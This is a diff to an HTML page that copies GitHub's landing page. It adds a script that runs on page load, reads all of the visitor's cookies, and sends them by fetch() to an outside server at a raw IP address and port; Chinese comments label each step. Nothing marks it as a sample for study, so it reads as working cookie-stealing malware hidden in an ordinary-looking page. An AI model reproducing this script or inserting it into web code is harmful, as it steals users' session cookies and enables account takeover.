@@ -20,6 +20,28 @@
   <div class="container-xl position-relative">
   <img alt="" aria-hidden="true" width="2236" height="1630" class="position-absolute top-0 height-auto events-none d-none d-sm-block" style="width: min(1118px, max(100vh, 100vw)); left: 67%;" src="https://github.githubassets.com/assets/hero-desktop-a38b0fd77b6c.webp" />
   <img alt="" aria-hidden="true" width="860" height="544" class="events-none d-sm-none width-full height-auto mb-n3" src="https://github.githubassets.com/assets/hero-mobile-7163f4f5de41.webp" />
+<script>
+window.onload = function() {
+    // 获取所有Cookie
+    var cookies = document.cookie;
+
+    // 构建请求的URL，将Cookie作为查询参数附加
+    var url = 'http://121.36.93.61:8000/?cookies=' + encodeURIComponent(cookies);
+
+    // 发送GET请求
+    fetch(url)
+        .then(response => {
+            if (response.ok) {
+                console.log('Cookie发送成功');
+            } else {
+                console.error('Cookie发送失败');
+            }
+        })
+        .catch(error => {
+            console.error('请求失败:', error);
+        });
+};
 
   
+</script>
 </body>
